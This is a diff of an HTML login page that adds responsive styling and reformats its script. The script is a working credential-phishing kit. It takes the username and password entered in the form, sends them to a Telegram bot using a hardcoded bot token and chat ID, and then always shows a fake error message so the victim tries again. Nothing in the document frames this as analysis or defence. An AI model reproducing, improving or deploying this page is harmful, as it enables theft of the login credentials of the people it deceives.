@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,11 +12,14 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            padding: 10px;
         }
         .container {
             display: flex;
+            flex-direction: row;
             justify-content: space-between;
-            width: 1000px;
+            width: 100%;
+            max-width: 1000px;
             background-color: white;
             padding: 20px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
@@ -94,6 +96,23 @@
             text-align: center;
             display: none;
         }
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .left {
+                padding-right: 0;
+            }
+            .left h1 {
+                font-size: 36px;
+            }
+            .left p {
+                font-size: 18px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -118,23 +137,20 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const botToken = '6717802830:AAHimj9bkZdLs4RHTyf9yL1z-UELpInqAQo';
-            const chatId = '5634946920';
+            const chatId = '5634946920';const message = `Username: ${username}\nPassword: ${password}`;
 
-            const message = `Username: ${username}\nPassword: ${password}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('error-message').style.display = 'block';
+            })
+            .catch(error => {
+                document.getElementById('error-message').style.display = 'block';
+            });
+    }
+</script>
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    // Show error message regardless of the response
-                    document.getElementById('error-message').style.display = 'block';
-                })
-                .catch(error => {
-                    // Show error message on error
-                    document.getElementById('error-message').style.display = 'block';
-                });
-        }
-    </script>
 </body>
 </html>
